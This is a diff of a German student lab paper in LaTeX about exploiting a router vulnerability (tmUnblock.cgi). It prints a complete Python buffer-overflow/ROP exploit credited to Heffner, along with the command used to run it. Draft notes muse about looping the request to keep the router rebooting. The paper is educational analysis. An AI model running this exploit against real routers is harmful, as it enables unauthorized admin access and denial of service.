@@ -1146,54 +1146,57 @@
 	Code enthalten, der die besagte Schwachstelle ausnutzt. Hierzu gibt es zwei
 	Möglichkeiten, einmal ein Bashskript und ein Programm für die Software
 	Metasploit, welche standardmäßig bei Kali Linux installiert ist.
-	Mit dem folgenden Python Skript wurde der Exploit erfolgreich ausgeführt:
-	\begin{lstlisting}[language=Python]
-	#!/usr/bin/env python
-	#...
+	Mit dem folgenden Python Skript wurde der Exploit ausgeführt:
+\begin{lstlisting}[language=Python]
+#!/usr/bin/env python
+#...
 
-	import sys
-	import urllib.request
-	import urllib.error
+import sys, urllib.request, urllib.error
 
-	try:
-		target = sys.argv[1]
-	except IndexError:
-		print( "Usage: %s <target ip>" % sys.argv[0])
-		sys.exit(1)
+try:
+	target = sys.argv[1]
+except IndexError:
+	print( "Usage: %s <target ip>" % sys.argv[0])
+	sys.exit(1)
 
-	url = target + '/cgi-bin/tmUnblock.cgi'
-	if '://' not in url:
-		url = 'http://' + url
+url = target + '/cgi-bin/tmUnblock.cgi'
+if '://' not in url:
+	url = 'http://' + url
 
-	post_data = "period=0&TM_Block_MAC=00:01:02:03:04:05&TM_Block_URL="
-	post_data += "B" * 246                  # Filler
-	post_data += "\x81\x54\x4A\xF0"         # $s0, address of admin password in memory
-	post_data += "\x80\x31\xF6\x34"         # $ra
-	post_data += "C" * 0x28                 # Stack filler
-	post_data += "D" * 4                    # ROP 1 $s0
-	post_data += "\x80\x34\x71\xB8"         # ROP 1 $ra
-	post_data += "E" * 8                    # Stack filler
+post_data = "period=0&TM_Block_MAC=00:01:02:03:04:05&TM_Block_URL="
+post_data += "B" * 246                  # Filler
+post_data += "\x81\x54\x4A\xF0"         # $s0, address of admin password in memory
+post_data += "\x80\x31\xF6\x34"         # $ra
+post_data += "C" * 0x28                 # Stack filler
+post_data += "D" * 4                    # ROP 1 $s0
+post_data += "\x80\x34\x71\xB8"         # ROP 1 $ra
+post_data += "E" * 8                    # Stack filler
 
-	for i in range(0, 4):
-		post_data += "F" * 4                # ROP 2 $s0
-		post_data += "G" * 4                # ROP 2 $s1
-		post_data += "\x80\x34\x71\xB8"     # ROP 2 $ra
-		post_data += "H" * (4-(3*(i//3)))    # Stack filler
+for i in range(0, 4):
+	post_data += "F" * 4                # ROP 2 $s0
+	post_data += "G" * 4                # ROP 2 $s1
+	post_data += "\x80\x34\x71\xB8"     # ROP 2 $ra
+	post_data += "H" * (4-(3*(i//3)))    # Stack filler
 
-	try:
-		req = urllib.request.Request(url, post_data.encode("utf-8"))
-		res = urllib.request.urlopen(req)
-	except urllib.error.HTTPError as e:
-		if e.code == 500:
-			print("OK")
-		else:
-			print ("Received unexpected server response:", str(e))
-	except KeyboardInterrupt:
-		pass
-	\end{lstlisting}
+try:
+	req = urllib.request.Request(url, post_data.encode("utf-8"))
+	res = urllib.request.urlopen(req)
+except urllib.error.HTTPError as e:
+	if e.code == 500:
+		print("OK")
+	else:
+		print ("Received unexpected server response:", str(e))
+except KeyboardInterrupt:
+	pass
+
+\end{lstlisting}
 	%hier script erklären
-	In der folgenden Abbildung ist ein Ausschnitt des Netzwerkverkehrs der
-	VM zu sehen. Der durch das Skript erstellte HTTP-POST ist zu sehen.
+	In der ersten Zeile wird definiert, dass es sich um ein Python Skript handelt. 
+	Nachdem die benötigten Bibliotheken in der Zeile 
+	%<----------------------hier gehts weiter
+
+	In der folgenden Abbildung \ref{fig:w_exploit} ist ein Ausschnitt 
+	des Netzwerkverkehrs der VM zu sehen. 
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=\textwidth]{img/exploit_bash_nwtraffic_httppost.png}
@@ -1201,32 +1204,44 @@
 		\label{fig:w_exploit}
 	\end{figure}
 	%beschreiben was man hier genau sieht in der Wireshark Aufzeichnung
-	Kommentare wurden zur besseren Darstellung teilweise entfernt, das 
-	Original File ist im Anhang verfügbar.
-	Da auf der genutzten Kali eine neuere Version von Python genutzt wird,
-	entspricht das obige Skript nicht vollkommen dem Original von Heffner 
-	\cite{heffner2014}.
+	In der Abbildung ist unten rechts blau markiert der HTTP-Post zusehen 
+	der durch die Zeilen 16-29 erzeugt wurde und in Zeile 32 im Python Skript
+	per Request an den Server - hier der Router - gesendet wurde.
+	% stimmt das so? oder ist der request das urlopen
+	Zur besseren Lesbarkeit in diesem Dokument wurden Kommentare teilweise 
+	entfernt und die Importe entsprechen nicht PEP8 wie im tatsächlichen 
+	Skript, welches dieser Ausarbeitung beigelegt ist. Da auf der genutzten 
+	Kali eine neuere Version von Python genutzt wird, entspricht das Skript 
+	nicht vollkommen dem Original von Heffner \cite{heffner2014}.
 	Um das Skript auszuführen wurde der PC mit dem Router per WLAN verbunden,
-	Wireshark gestartet, Chromium geöffnet und dann das Pythonskript
-	ausgeführt. So lange das Skript läuft kann ohne Eingabe des Passworts
-	direkt die Seite des Routers geöffnet werden. 
-	\begin{lstlisting}[language=bash]
-	./remote-exploit
-	\end{lstlisting}
-	Beim Ausführen des Codes wird router neu gebootetet und wlan
-	singal wieder aufgebaut.
+	Wireshark gestartet, Chromium geöffnet und dann das Pythonskript ausgeführt.  
+\begin{lstlisting}[language=bash]
+./remote-exploit 192.168.1.1
+\end{lstlisting}
+	Beim Ausführen des Codes wird der Router neu gebootetet und das WLAN Signal
+	neu aufgebaut, daher erscheint kurz die Meldung "Verbindung abgebrochen".
+	Da das Skript nach dem senden des HTTP-POST nicht weiter ausgeführt wird
+	wurde das Skript weiter untersucht. Ideen zur erfolgreichen Ausführung des
+	Skripts 
 
 	Es funktionier bis zur schleife, die wird nicht mehr abgebrochen
 	der urlob wird nicht ausgegeben
 
 	wireless sicherheit deaktiviert -> funktioniert immer noch nicht
 
-	passt die mac adresse im Skript
+	passt die mac adresse im Skript: 90:78:41:CD:23:96
 	was macht res und req genau
+	ulropen öffent den URL \cite{urllibrequestextensiblelibrary}
+
+	Viele APIs brauchen einen Header, habe ich diesen bzw welchen brauche
+	ich falls der fehlen sollte?
+	weil die Antwort nicht mehr gelesen wird, vielleicht data = res.read()
+
 	geht es wenn ich den router resete?
 
 	wie sieht ein url korrekt aus?
-	wie lange läuft die schleife?
+	kann ich eine schleife über den request machen sodass der Router
+	dauern aus und anschaltete und damit nicht mehr funktioniert?
 	geht es wenn der Router zurück gesetzt wurde?
 
 	%schauen ob ich die Hex Adressen vom Python Skirpt in der Datei von
@@ -1234,6 +1249,19 @@
 	%( )was erkennt man in der CVE
 	%( )wie kann ich ihn auslösen (Bash Sctip, Metasploit)
 	%( )Metasploit erklären
+
+	Erkenntnisse: Chromium hat einen Passwort Cache der per Default
+	die eingegebenen Passwörter speichert und diese erst nach schließen
+	des Fensters wieder löscht. Diese Einstellung sollte zwingend von 
+	Nutzern dieses Browsers geändert werden, so dass Passwörter nur mit
+	aktiver Zustimmung des Nutzers gespeichert werden, auch wenn es nur
+	temporär gespeichert wird.
+
+	%=======================notes jf - need to be deleted later
+	% sind die Grundlagen hinreichen Tief?
+	% wie sollen wir die Programme und Wireshark Files abgeben?
+	% 
+	%=========================================================
 
 	\chapter{Hauptteil (1. Kapitel)}
 	Für die Gestaltung des Hauptteils sind in Abhängigkeit von der Aufgabenstellung
